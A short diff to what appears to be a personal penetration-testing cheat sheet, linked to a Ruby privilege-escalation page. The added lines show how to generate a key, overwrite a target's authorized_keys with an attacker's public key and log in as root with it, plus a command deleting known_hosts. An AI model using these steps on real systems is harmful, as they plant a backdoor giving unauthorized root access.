@@ -48,9 +48,17 @@ https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege
 
 `rm ~/.ssh/known_hosts`
 
-* fake auth hosts
+* generate fake keys 
+
+`ssh-keygen`
+
+* insert fake auth hosts
 
 `cat bad_up.pub >  authorized_keys`
+
+* use fake key
+
+`ssh -i fake_root_key root@ip`
 
 ## setup puthon virtualenv
 
